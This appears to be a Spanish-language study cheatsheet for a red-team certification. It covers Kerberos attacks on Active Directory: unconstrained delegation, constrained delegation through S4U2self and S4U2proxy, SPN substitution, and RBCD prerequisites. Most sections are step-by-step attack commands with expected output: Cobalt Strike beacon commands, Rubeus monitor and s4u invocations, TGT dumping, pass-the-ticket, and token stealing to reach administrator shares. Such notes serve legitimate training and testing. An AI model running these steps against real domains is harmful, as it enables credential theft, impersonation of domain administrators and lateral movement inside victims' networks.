## Kerberos — flujo de autenticación resumido

```
Cliente → KDC (AS): AS-REQ (preauth: timestamp cifrado con hash del usuario)
KDC → Cliente (AS): AS-REP (TGT + clave de sesión, cifrados con hash krbtgt y hash usuario)

Cliente → KDC (TGS): TGS-REQ (TGT + autenticador cifrado con clave de sesión + SPN objetivo)
KDC → Cliente (TGS): TGS-REP (ticket de servicio cifrado con hash de la cuenta del servicio)

Cliente → Servicio: AP-REQ (ticket de servicio + autenticador cifrado con clave de sesión del servicio)
Servicio → Cliente: AP-REP (marca de tiempo re-cifrada — autenticación mutua)
```

**Qué permite crackear qué:**

| Mensaje/parte | Cifrado con | Técnica de abuso |
|---|---|---|
| `EncASRepPart` (del AS-REP) | Hash del usuario | **AS-REP Roasting** — recuperar contraseña del usuario |
| `EncTicketPart` (del TGS-REP) | Hash de la cuenta de servicio | **Kerberoasting** — recuperar contraseña de la cuenta de servicio |
| TGT completo | Hash de krbtgt | **Golden Ticket** — si tienes el hash de krbtgt |

---

## Conceptos clave — qué se cifra con qué

| Elemento | Quién puede descifrarlo | Por qué importa |
|---|---|---|
| TGT (EncTicketPart) | Solo el KDC (hash krbtgt) | El cliente lo lleva pero no puede leerlo |
| Clave de sesión de inicio de sesión | Cliente (cifrada con su hash en el AS-REP) | Necesaria para construir TGS-REQ |
| Ticket de servicio (EncTicketPart) | Solo el servicio destino (cifrado con su hash) | El cliente lo lleva pero no puede leerlo → **Kerberoasting** |
| Clave de sesión del servicio | Cliente (cifrada con clave de sesión de inicio de sesión) | Necesaria para el AP-REQ |
| PAC | KDC lo firma con hash krbtgt + hash del servicio | Contiene grupos, RID, UAC del usuario — el servicio lo lee |

## Unconstrained Delegation — cómo funciona el abuso

**¿Qué es?**
Un equipo marcado con `TRUSTED_FOR_DELEGATION` (flag en `userAccountControl`) le indica al KDC que incluya una copia del TGT del usuario en el ticket de servicio. El equipo puede entonces usar ese TGT para autenticarse en **cualquier servicio** del dominio en nombre del usuario.

**Flujo del abuso:**
```
1. Usuario se autentica en un servicio de un equipo con UD configurada
2. El DC incluye el TGT del usuario en el TGS → el equipo lo almacena en memoria
3. Atacante con acceso al equipo → extrae el TGT → lo usa como Pass-the-Ticket
4. Con el TGT de un DA → acceso a cualquier recurso del dominio
```

> ⚠️ **Los DCs siempre tienen Unconstrained Delegation** — no son un objetivo viable (ya necesitarías ser DA para comprometer un DC). Buscar **otros equipos** con este flag.

## Explotación — capturar y usar TGTs

### Método 1 — krb_triage + krb_dump (BOF — mejor OPSEC)

> Usa LSA APIs — más silencioso que Mimikatz/Rubeus execute-assembly.

```bash
# Desde el Beacon en el equipo con Unconstrained Delegation (ej: lon-ws-1)
# Ver todos los tickets cacheados — buscar TGTs de usuarios interesantes
beacon> krb_triage
# Buscar entradas con servicio "krbtgt/CONTOSO.COM" de usuarios distintos al equipo

# Extraer el TGT del usuario objetivo
beacon> krb_dump /user:dyork /service:krbtgt
# → Output: base64 del TGT
# → Guardar el base64 (Notepad/VSCode)
```

### Método 2 — Rubeus monitor (captura continua — fork & run)

> Más ruidoso (execute-assembly = fork & run), pero captura TGTs en tiempo real.

```bash
# Monitorizar y capturar TGTs nuevos automáticamente
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
# → Muestra TGTs cuando usuarios se autentican en servicios del equipo
# → Output: User, StartTime, EndTime, RenewTill, Base64EncodedTicket

# Parar el monitor cuando termines (es un job de larga duración)
beacon> jobs
# → JID X  PID XXXX  .NET assembly
beacon> jobkill X    # matar por JID
```

### Usar el TGT capturado — Pass-the-Ticket

```bash
# Guardar el ticket base64 a disco en el atacante
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\dyork.kirbi", [Convert]::FromBase64String("[B64_TICKET_AQUI]"))

# Crear sesión sacrificial vacía
beacon> make_token CONTOSO\dyork FakePass
# → (netonly) — nueva sesión con caché de tickets vacía

# Inyectar el TGT en la sesión
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\dyork.kirbi

# Verificar que el ticket está presente
beacon> run klist

# Acceder a recursos con los privilegios del DA
beacon> ls \\lon-dc-1\c$
# → Debe funcionar si dyork es DA

# Limpiar
beacon> rev2self
```

## Contexto — S4U2self y S4U2proxy

> La delegación restringida limita a qué servicios puede delegar un equipo (a diferencia de Unconstrained Delegation que permite cualquier servicio). Se configura vía `msDS-AllowedToDelegateTo`.

| Protocolo S4U | Qué hace | Cuándo se usa |
|---|---|---|
| **S4U2self** | El equipo obtiene un ticket de servicio para sí mismo, en nombre de un usuario | Cuando el usuario no se autenticó con Kerberos (NTLM, etc.) — requiere `TRUSTED_TO_AUTH_FOR_DELEGATION` |
| **S4U2proxy** | El equipo usa un ticket de servicio de usuario para obtener otro ticket al servicio back-end | Siempre — es el paso final que obtiene el ticket al servicio objetivo |

**Flujo con Protocol Transition (más potente):**
```
TGT equipo → S4U2self → ticket reenviable para cualquier usuario
           → S4U2proxy → ticket de servicio al back-end como ese usuario
```

**Flujo sin Protocol Transition (más limitado):**
```
Ticket de servicio existente de un usuario real (capturado)
→ S4U2proxy directamente → ticket de servicio al back-end como ese usuario
```

---

## Comparativa — con y sin Protocol Transition

| | Con Protocol Transition | Sin Protocol Transition |
|---|---|---|
| **Flag UAC requerido** | `TRUSTED_TO_AUTH_FOR_DELEGATION` (16777216) | Solo `WORKSTATION_TRUST_ACCOUNT` |
| **Puede suplantar** | Cualquier usuario del dominio (libre elección) | Solo usuarios con ticket de servicio existente |
| **Necesitas** | TGT del equipo | TGT del equipo + ticket de servicio capturado de un usuario |
| **Ticket S4U2self** | Reenviable → usable en S4U2proxy | **No reenviable** → S4U2proxy falla con `KDC_ERR_BADOPTION` |
| **Comando Rubeus** | `s4u /impersonateuser:Administrator` | `s4u /tgs:[ticket_servicio_capturado]` |

## Enumeración — encontrar equipos con Constrained Delegation

### Buscar equipos con msDS-AllowedToDelegateTo configurado

```bash
# msDS-AllowedToDelegateTo=* → tiene al menos un SPN permitido para delegar
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl

# Output esperado:
# sAMAccountName: LON-WS-1$
# msDS-AllowedToDelegateTo: cifs/lon-fs-1.contoso.com, cifs/lon-fs-1
# userAccountControl: 16781312
```

### Verificar si Protocol Transition está habilitado

```bash
# Comprobar si el flag TRUSTED_TO_AUTH_FOR_DELEGATION (16777216) está activo
# Hacer AND bitwise del valor UAC con el valor del flag
# Si devuelve True → Protocol Transition habilitado → MÉTODO 1
# Si devuelve False → Solo Kerberos → MÉTODO 2

# En PowerShell (desde Terminal del atacante o beacon powerpick):
[Convert]::ToBoolean(16781312 -band 16777216)
# → True = Protocol Transition habilitado (más potente)
# → False = Solo Kerberos (más limitado)

# Sustituir 16781312 por el valor userAccountControl del equipo objetivo
```

**Flags UAC relevantes:**

| Flag | Valor decimal | Significado |
|---|---|---|
| `WORKSTATION_TRUST_ACCOUNT` | 4096 | Cuenta de equipo estándar |
| `TRUSTED_TO_AUTH_FOR_DELEGATION` | 16777216 | Protocol Transition habilitado |
| Combinación típica con PT | 16781312 | `4096 + 16777216 + 4096` (base + PT + otros) |

## MÉTODO 1 — Con Protocol Transition (suplantar cualquier usuario)
**Requiere:** Acceso al equipo con CD + flag `TRUSTED_TO_AUTH_FOR_DELEGATION` activo

### Paso 1 — Obtener el TGT del equipo (LUID 3e7 = cuenta de equipo)

```bash
# Desde el Beacon en el equipo con Constrained Delegation (lon-ws-1)
# LUID 0x3e7 = sesión de la cuenta de equipo (siempre este valor)
beacon> krb_dump /luid:3e7 /service:krbtgt
# → Output: base64 del TGT de LON-WS-1$
# → Guardar el base64

# Alternativa con Rubeus:
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
# → Ver el LUID de la sesión del equipo (krbtgt/CONTOSO.COM para LON-WS-1$)
```

### Paso 2 — S4U2self + S4U2proxy con Rubeus (ambos pasos en uno)

```bash
# Sintaxis: s4u /user:[equipo$] /msdsspn:[SPN_destino] /ticket:[TGT_base64] /impersonateuser:[usuario] /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u \
    /user:lon-ws-1$ \
    /msdsspn:cifs/lon-fs-1 \
    /ticket:[TGT_BASE64_DEL_EQUIPO] \
    /impersonateuser:Administrator \
    /nowrap

# Parámetros:
# /user           → SamAccountName del equipo configurado para CD (con $)
# /msdsspn        → SPN al que está permitido delegar (de msDS-AllowedToDelegateTo)
# /ticket         → TGT base64 del equipo (obtenido en Paso 1)
# /impersonateuser → usuario a suplantar (cualquier usuario del dominio)
# /nowrap         → no partir el ticket en múltiples líneas

# Output:
# [+] S4U2self success! → TGS para Administrator a LON-WS-1$
# [+] S4U2proxy success! → ticket de servicio para cifs/lon-fs-1 como Administrator
# base64(ticket.kirbi): doIGf[...]ZzLTE=   ← ESTE es el ticket a usar
```

### Paso 3 — Alternativa con krb_s4u BOF (más OPSEC — lab)

```bash
# BOF directo — más silencioso que execute-assembly
# Sintaxis: krb_s4u /ticket:[TGT_base64] /service:[SPN] /impersonateuser:[usuario]
beacon> krb_s4u /ticket:[TGT_BASE64] /service:cifs/lon-fs-1 /impersonateuser:Administrator
# → Devuelve ticket de servicio usable para cifs/lon-fs-1 como Administrator
```

## MÉTODO 2 — Sin Protocol Transition (limitado a tickets existentes)
**Requiere:** Acceso al equipo con CD + ticket de servicio de un usuario real ya capturado

> Sin Protocol Transition, S4U2self devuelve un ticket **no reenviable** → no funciona con S4U2proxy. Solo se puede usar un ticket de servicio real de un usuario que ya se autenticó en el equipo.

```bash
# Paso 1 — Capturar ticket de servicio de un usuario real
# (por ejemplo, dyork se autenticó en HTTP/lon-ws-1)
beacon> krb_triage
# → Ver tickets con servicio HTTP/lon-ws-1 u otro servicio del equipo

beacon> krb_dump /user:dyork /service:HTTP
# → base64 del ticket de servicio HTTP de dyork

# Paso 2 — S4U2proxy usando el ticket capturado (/tgs en vez de /impersonateuser)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u \
    /user:lon-ws-1$ \
    /msdsspn:cifs/lon-fs-1 \
    /ticket:[TGT_BASE64_EQUIPO] \
    /tgs:[TICKET_SERVICIO_DYORK_BASE64] \
    /nowrap

# Parámetros diferentes vs Método 1:
# /tgs → ticket de servicio capturado del usuario (en vez de /impersonateuser)
# El resto igual

# Output:
# [+] S4U2proxy success! → ticket de servicio para cifs/lon-fs-1 como dyork
```

> ⚠️ **Error `KDC_ERR_BADOPTION`:** aparece si intentas usar S4U2proxy con un ticket no reenviable (S4U2self sin Protocol Transition). Significa que no tienes PT habilitado y necesitas un ticket real de un usuario.

> ⚠️ **Bronze Bit (CVE-2020-17049):** existía una vulnerabilidad que permitía modificar el bit de reenvío de un ticket no reenviable. **Ya está parcheado** — no funciona en sistemas actualizados.

## Usar el ticket de servicio obtenido

> El ticket de servicio resultante (de S4U2proxy) hay que inyectarlo en una sesión para usarlo.

### Opción A — Rubeus createnetonly + steal_token (recomendado)

```bash
# Crear proceso con sesión que tenga el ticket inyectado
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly \
    /program:C:\Windows\System32\cmd.exe \
    /domain:CONTOSO.COM \
    /username:Administrator \
    /password:FakePass \
    /ticket:[TICKET_SERVICIO_BASE64]

# Output:
# ProcessID: 3380
# LUID: 0x9b6c93
# Ticket successfully imported!

# Robar token del proceso creado
beacon> steal_token 3380

# Acceder al servicio
beacon> ls \\lon-fs-1\c$

# Limpiar
beacon> rev2self
beacon> kill 3380
```

## Contexto — por qué funciona la sustitución

> El campo `sname` (nombre del servicio) dentro de un ticket de servicio **no está cifrado** y **no se incluye en el cálculo del checksum**. Esto significa que se puede sobreescribir sin invalidar el ticket.

**Condición:** solo funciona si el SPN original y el SPN sustituido se ejecutan bajo la **misma cuenta**. Si los servicios son de la misma máquina (ej: `time/lon-dc-1` y `cifs/lon-dc-1` ambos corren como `LON-DC-1$`), la sustitución funciona porque la clave de sesión está cifrada con el mismo secreto.

```
Ticket para time/lon-dc-1
    sname: time/lon-dc-1  ← no cifrado, modificable
    EncTicketPart         ← cifrado con hash de LON-DC-1$ (no cambia)

Después de sustituir:
    sname: cifs/lon-dc-1  ← campo sobrescrito
    EncTicketPart         ← mismo hash → sigue siendo válido
```

---

## Cuándo usar esta técnica

> Usar cuando la delegación restringida apunta a un SPN que **no es útil para acceso remoto** (como `time`, `wsman`, `rpcss`, etc.) pero el equipo destino corre otros servicios bajo la misma cuenta.

**Servicios útiles para acceso remoto:**

| Servicio sustituido | Acceso que otorga |
|---|---|
| `cifs/<host>` | SMB — listar C$, mover archivos, lateral movement |
| `host/<host>` | Servicios generales del host |
| `http/<host>` | WinRM, IIS |
| `ldap/<host>` | Consultas LDAP al DC |

**SPNs típicamente delegados pero poco útiles directamente:**

| SPN delegado | Por qué no es útil solo |
|---|---|
| `time/<host>` | Solo sincronización de tiempo |
| `wsman/<host>` | WS-Management sin contexto de acceso directo |
| `rpcss/<host>` | RPC endpoint mapper |

## CRTO — Resource-Based Constrained Delegation (RBCD) Cheatsheet

## Contexto — RBCD vs Delegación Restringida clásica

> En la delegación restringida clásica, el **servicio de front-end** dicta a qué back-ends puede delegar (requiere `SeEnableDelegationPrivilege` — solo DA/EA pueden configurarlo).
> En RBCD, es el **servicio de back-end** quien controla qué front-ends pueden delegarle. Basta con tener `WriteProperty` sobre el atributo del equipo back-end.

| | Delegación Restringida clásica | RBCD |
|---|---|---|
| **Quién configura** | Admin de dominio (`SeEnableDelegationPrivilege`) | Quien tenga WriteProperty sobre el atributo del equipo back-end |
| **Atributo** | `msDS-AllowedToDelegateTo` en el front-end | `msDS-AllowedToActOnBehalfOfOtherIdentity` en el back-end |
| **Control** | El front-end decide los back-ends | El back-end decide qué front-ends le pueden delegar |
| **Explotación** | Comprometer el front-end → tickets al back-end | WriteProperty en back-end + control de un equipo con SPN |

---

## Requisitos para el abuso

Para abusar de RBCD se necesitan **dos cosas simultáneamente:**

**1. WriteProperty sobre `msDS-AllowedToActOnBehalfOfOtherIdentity` del equipo objetivo**
- GUID del atributo: `3f78c3e5-f79a-46bd-a0b8-9d18116ddc79`
- Puede provenir de: `WriteProperty`, `GenericWrite`, o `GenericAll` sobre el objeto equipo

**2. Control de un principal con SPN configurado** (para añadir en el atributo):

| Opción | Cómo obtenerla |
|---|---|
| Cuenta de equipo (mejor) | Tener SYSTEM en cualquier equipo del dominio — cada equipo tiene SPNs por defecto (HOST, WSMAN, TERMSRV…) |
| Cuenta de servicio | Credenciales obtenidas por Kerberoasting |
| Equipo ficticio | Crear uno con StandIn si `msDS-MachineAccountQuota > 0` (por defecto 10) |

> ⚠️ **Restricción de tipo:** `PrincipalsAllowedToDelegateToAccount` solo acepta valores del mismo tipo. Si el atributo ya tiene equipos, solo puedes añadir más equipos (no usuarios). **Nunca sobrescribir una entrada existente** sin haberla guardado primero.
